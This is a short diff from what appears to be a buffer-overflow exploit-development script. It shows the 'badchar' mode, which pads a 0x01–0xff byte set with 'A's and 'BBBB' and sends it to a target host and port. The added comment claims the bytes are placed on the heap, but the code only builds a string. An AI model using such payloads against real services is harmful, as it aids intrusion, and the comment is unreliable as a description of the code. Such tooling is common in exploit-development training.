@@ -135,6 +135,7 @@ elif mode == "offset":
 elif mode == "badchar":
     # Generate 0x01 to 0xff into a string
     badchars = "".join([chr(h) for h in range(1, 256)])
+    # As the stack size might be limited, we place this full set of bad characters inside heap
     payload = args.blength * "A" + "B" * 4 + badchars
     print("sending bad character test payload:", payload)
     send_chunk(args.target, args.port, args.prefix, payload, True)
